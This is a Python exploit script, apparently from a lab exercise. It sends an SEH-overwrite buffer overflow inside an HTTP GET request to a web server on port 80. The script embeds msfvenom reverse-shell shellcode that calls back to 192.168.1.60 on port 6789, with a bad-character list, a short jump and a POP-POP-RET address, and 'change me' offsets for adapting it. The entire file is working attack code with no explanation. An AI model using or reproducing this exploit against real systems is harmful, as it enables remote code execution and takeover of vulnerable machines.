import socket
import os
import sys
import struct

ip = "127.0.0.1"
port = 80

#\x00\x0a\x0d\x20\x25\x2f\x5c
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00\x0a\x0d\x20\x25\x2f\x5c' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xdb\xcf\xbe\x3f\xe3\xd2\xa3\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x72\x17\x83\xea\xfc"
shellcode += b"\x03\x4d\xf0\x30\x56\x4d\x1e\x36\x99\xad\xdf"
shellcode += b"\x57\x13\x48\xee\x57\x47\x19\x41\x68\x03\x4f"
shellcode += b"\x6e\x03\x41\x7b\xe5\x61\x4e\x8c\x4e\xcf\xa8"
shellcode += b"\xa3\x4f\x7c\x88\xa2\xd3\x7f\xdd\x04\xed\x4f"
shellcode += b"\x10\x45\x2a\xad\xd9\x17\xe3\xb9\x4c\x87\x80"
shellcode += b"\xf4\x4c\x2c\xda\x19\xd5\xd1\xab\x18\xf4\x44"
shellcode += b"\xa7\x42\xd6\x67\x64\xff\x5f\x7f\x69\x3a\x29"
shellcode += b"\xf4\x59\xb0\xa8\xdc\x93\x39\x06\x21\x1c\xc8"
shellcode += b"\x56\x66\x9b\x33\x2d\x9e\xdf\xce\x36\x65\x9d"
shellcode += b"\x14\xb2\x7d\x05\xde\x64\x59\xb7\x33\xf2\x2a"
shellcode += b"\xbb\xf8\x70\x74\xd8\xff\x55\x0f\xe4\x74\x58"
shellcode += b"\xdf\x6c\xce\x7f\xfb\x35\x94\x1e\x5a\x90\x7b"
shellcode += b"\x1e\xbc\x7b\x23\xba\xb7\x96\x30\xb7\x9a\xfe"
shellcode += b"\xf5\xfa\x24\xff\x91\x8d\x57\xcd\x3e\x26\xff"
shellcode += b"\x7d\xb6\xe0\xf8\x82\xed\x55\x96\x7c\x0e\xa6"
shellcode += b"\xbf\xba\x5a\xf6\xd7\x6b\xe3\x9d\x27\x93\x36"
shellcode += b"\x31\x77\x3b\xe9\xf2\x27\xfb\x59\x9b\x2d\xf4"
shellcode += b"\x86\xbb\x4e\xde\xae\x56\xb5\x89\x10\x0e\xb4"
shellcode += b"\x75\xf9\x4d\xb6\x9f\x7c\xd8\x50\xf5\x6e\x8d"
shellcode += b"\xcb\x62\x16\x94\x87\x13\xd7\x02\xe2\x14\x53"
shellcode += b"\xa1\x13\xda\x94\xcc\x07\x8b\x54\x9b\x75\x1a"
shellcode += b"\x6a\x31\x11\xc0\xf9\xde\xe1\x8f\xe1\x48\xb6"
shellcode += b"\xd8\xd4\x80\x52\xf5\x4f\x3b\x40\x04\x09\x04"
shellcode += b"\xc0\xd3\xea\x8b\xc9\x96\x57\xa8\xd9\x6e\x57"
shellcode += b"\xf4\x8d\x3e\x0e\xa2\x7b\xf9\xf8\x04\xd5\x53"
shellcode += b"\x56\xcf\xb1\x22\x94\xd0\xc7\x2a\xf1\xa6\x27"
shellcode += b"\x9a\xac\xfe\x58\x13\x39\xf7\x21\x49\xd9\xf8"
shellcode += b"\xf8\xc9\xf9\x1a\x28\x24\x92\x82\xb9\x85\xff"
shellcode += b"\x34\x14\xc9\xf9\xb6\x9c\xb2\xfd\xa7\xd5\xb7"
shellcode += b"\xba\x6f\x06\xca\xd3\x05\x28\x79\xd3\x0f"

CRASH_LEN = 5000  # change me
OFFSET = 4061  # change me

payload = b"A" * OFFSET
payload += struct.pack("<I",0x06eb9090) # short jump 8 - NSEH
payload += struct.pack("<I",0x100103fe) #PPR SEH
payload += b"\x90" * 10
payload += shellcode
payload += b"D" * (CRASH_LEN - len(payload))


buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
